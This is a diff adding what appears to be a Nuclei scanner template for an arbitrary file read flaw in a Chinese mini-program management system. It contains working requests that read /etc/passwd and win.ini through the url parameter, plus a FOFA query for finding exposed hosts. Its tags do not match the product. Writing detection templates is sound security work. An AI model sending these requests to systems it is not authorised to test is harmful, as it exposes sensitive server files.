@@ -1,0 +1,28 @@
+id: wannneg-applet-anyfileread
+info:
+  name: 万能小程序运营管理系统任意文件读取漏洞
+  author: fgz
+  severity: high
+  description: '万能小程序运营管理系统是一款功能强大的综合性平台，专为开发者和运营人员打造，旨在简化和提升小程序的管理与推广。该系统集成了丰富的功能模块，覆盖了小程序从开发、部署到运营管理的完整流程。通过提供多样化的工具和便捷的操作，用户可以轻松创建、管理和优化小程序。系统支持多平台部署，兼容微信、支付宝、百度、QQ等多种小程序平台，满足各类用户的多样需求。该系统/api/wxapps/_requestPost接口处存在任意文件读取漏洞，容易造成敏感信息泄露'
+  tags: fanwei,oa,E-Mobile,fileread
+  metadata:
+    max-request: 1
+    fofa-query: body="/com/css/head_foot.css" || body="/com/css/iconfont"
+    verified: true
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/wxapps/_requestPost?data=1&url=file:///etc/passwd"
+      - "{{BaseURL}}/api/wxapps/_requestPost?data=1&url=file://C:\\Windows\\win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "; for 16-bit app support"
+          - "root:x:"
+        condition: or
+        part: body
